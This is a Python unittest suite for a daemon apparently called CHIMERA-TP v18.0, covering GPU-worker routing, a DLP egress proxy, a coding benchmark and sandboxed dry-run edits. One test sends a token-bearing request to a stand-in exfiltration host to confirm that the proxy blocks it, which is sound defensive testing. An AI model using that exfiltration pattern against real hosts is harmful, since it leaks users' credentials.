"""Comprehensive verification suite for CHIMERA-TP v18.0 PERFECTION (4-Tier Colab+PTX VGPU, DLP+UCB1, Folded-Cavity RLNC, Ghost Bubble & Lazy RAM)."""

from __future__ import annotations

import http.server
import json
import sys
import tempfile
import threading
import unittest
import urllib.error
import urllib.request
from pathlib import Path

from chimera_tp.autopilot import OpsConfig
from chimera_tp.dashboard import ChimeraDaemon
from chimera_tp.platform import CristaeFoldedCavityRLNC, NvCudaPtxEngine


class TestV18Perfection(unittest.TestCase):
    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        self.ops_dir = Path(self._tmp.name) / "ops"
        cfg = OpsConfig(
            node_name="v18-test",
            role="controller",
            dashboard_bind="127.0.0.1:0",
            beam_port=0,
            rpc_v4_port=0,
            rpc_v6_port=-1,
            query_port=0,
            warp_port=-1,
            edge_proxy_port=-1,
            allowed_query_roots=[self._tmp.name],
            search_roots=[self._tmp.name],
            edge_targets={},
            phantom_enabled=False,
        )
        self.daemon = ChimeraDaemon(config=cfg, ops_dir=self.ops_dir, auto_seed_on_empty=False).start()
        self.anchor = self.daemon.platform.anchor_url
        self.proxy = self.daemon.platform.egress.url

    def tearDown(self) -> None:
        self.daemon.close()
        self._tmp.cleanup()

    def _get(self, path: str) -> dict:
        with urllib.request.urlopen(f"{self.anchor}{path}", timeout=5.0) as r:
            return json.loads(r.read().decode("utf-8"))

    def _post(self, path: str, body: dict) -> tuple[int, dict]:
        req = urllib.request.Request(
            f"{self.anchor}{path}",
            data=json.dumps(body).encode("utf-8"),
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        try:
            with urllib.request.urlopen(req, timeout=8.0) as r:
                return r.status, json.loads(r.read().decode("utf-8"))
        except urllib.error.HTTPError as e:
            return e.code, json.loads(e.read().decode("utf-8"))

    def test_01_4tier_colab_pro_offload_and_nvcuda_ptx_jit(self) -> None:
        # Mock a live Colab Pro T4 CUDA worker
        class ColabH(http.server.BaseHTTPRequestHandler):
            def do_POST(self) -> None:
                clen = int(self.headers.get("Content-Length", "0") or 0)
                body = json.loads(self.rfile.read(clen).decode() or "{}")
                texts = body.get("input", [])
                if isinstance(texts, str):
                    texts = [texts]
                dim = int(body.get("dimensions") or 128)
                resp = json.dumps({
                    "object": "list",
                    "model": "chimera-colab-cuda",
                    "data": [{"object": "embedding", "index": i, "embedding": [0.1] * dim} for i in range(len(texts))],
                    "chimera_engine": "colab_pro_cuda",
                }).encode()
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(resp)))
                self.end_headers()
                self.wfile.write(resp)

            def log_message(self, *_a: object) -> None:
                pass

        srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), ColabH)
        port = srv.server_address[1]
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        try:
            st_r, reg = self._post(
                "/v1/vgpu/workers/register",
                {"worker_id": "colab-pro-t4", "url": f"http://127.0.0.1:{port}", "gpu_name": "NVIDIA Tesla T4", "vram_mb": 15360},
            )
            self.assertEqual(st_r, 200)
            self.assertEqual(reg["worker"]["worker_id"], "colab-pro-t4")

            # Pareto router MUST prefer Colab Pro CUDA to keep Windows workstation at 0% GPU impact
            st_p, route = self._post("/v1/vgpu/route", {"max_ms": 500, "max_cost_usd": 0.0, "min_tier": "high"})
            self.assertEqual(st_p, 200)
            self.assertEqual(route["selected"]["engine"], "colab_pro_cuda")
            self.assertEqual(route["selected"]["workstation_impact"], "0%")

            # OpenAI-compat embeddings offloaded directly to Colab Pro worker
            st_e, emb = self._post("/v1/openai/v1/embeddings", {"input": ["heavy cuda job 1", "heavy cuda job 2"], "dimensions": 128})
            self.assertEqual(st_e, 200)
            self.assertIn("colab_pro", emb["chimera_engine"])
            self.assertEqual(len(emb["data"]), 2)
        finally:
            srv.shutdown(); srv.server_close()

        # Test real nvcuda.dll PTX JIT kernel on Windows GTX 1650 (or clean CPU yield fallback on Linux)
        st_k, kres = self._post("/v1/vgpu/ptx-bench", {"n": 4096, "force": True})
        self.assertEqual(st_k, 200)
        self.assertTrue(kres["ok"])
        if NvCudaPtxEngine().probe()["available"]:
            self.assertEqual(kres["engine"], "win_nvcuda_ptx")
            self.assertEqual(kres["vram_retained_mb"], 0.0)

    def test_02_zero_leak_egress_dlp_and_ucb1_domain_bandit(self) -> None:
        opener = urllib.request.build_opener(urllib.request.ProxyHandler({"http": self.proxy}))
        # Outbound secret leak to non-whitelisted external host MUST be blocked with 403 X-Chimera-DLP: BLOCKED!
        leak_url = "http://evil-exfil.example.invalid/collect?tok=ghp_1234567890abcdefghijklmnop"
        req = urllib.request.Request(leak_url, headers={"X-Chimera-App": "compromised-pkg"})
        with self.assertRaises(urllib.error.HTTPError) as ctx:
            opener.open(req, timeout=4.0)
        self.assertEqual(ctx.exception.code, 403)
        self.assertEqual(ctx.exception.headers.get("X-Chimera-DLP"), "BLOCKED")
        st = self._get("/v1/egress/stats")["egress"]
        self.assertGreaterEqual(st["dlp_blocked"], 1)

        doms = self._get("/v1/egress/domains")
        self.assertTrue(doms["ok"])

    def test_03_cristae_folded_cavity_sc_rlnc_32pct_burst_loss(self) -> None:
        st, res = self._post("/v1/rlnc/folded-bench", {"payload_bytes": 16384, "loss_rate": 0.32})
        self.assertEqual(st, 200)
        self.assertTrue(res["ok"])
        self.assertTrue(res["sha256_exact"])
        self.assertTrue(res["within_64kb_l2"])
        self.assertGreaterEqual(res["loss_rate_pct"], 30.0)

    def test_04_ghost_bubble_zero_risk_dry_run_discard_and_commit(self) -> None:
        ws = Path(self._tmp.name) / "target_proj"
        ws.mkdir()
        (ws / "config.txt").write_text("v1=safe\n", encoding="utf-8")

        # 1. Dry-run destructive edit inside bubble -> discard -> host file 100% untouched!
        st1, b1 = self._post(
            "/v1/ghost/run",
            {
                "target_dir": str(ws),
                "cmd": [sys.executable, "-c", "open('config.txt','w').write('BROKEN'); open('new.txt','w').write('hi')"],
            },
        )
        self.assertEqual(st1, 200)
        self.assertEqual(b1["exit_code"], 0)
        self.assertEqual(b1["diff"]["modified"], ["config.txt"])
        self.assertEqual(b1["diff"]["added"], ["new.txt"])
        self._post("/v1/ghost/discard", {"bubble_id": b1["bubble_id"]})
        self.assertEqual((ws / "config.txt").read_text(encoding="utf-8"), "v1=safe\n")
        self.assertFalse((ws / "new.txt").exists())

        # 2. Dry-run good edit inside bubble -> commit -> host updated atomically!
        st2, b2 = self._post(
            "/v1/ghost/run",
            {
                "target_dir": str(ws),
                "cmd": [sys.executable, "-c", "open('config.txt','w').write('v2=upgraded\\n')"],
            },
        )
        self.assertEqual(st2, 200)
        st_c, cres = self._post("/v1/ghost/commit", {"bubble_id": b2["bubble_id"]})
        self.assertEqual(st_c, 200)
        self.assertTrue(cres["committed"])
        self.assertEqual((ws / "config.txt").read_text(encoding="utf-8"), "v2=upgraded\n")


if __name__ == "__main__":
    unittest.main()
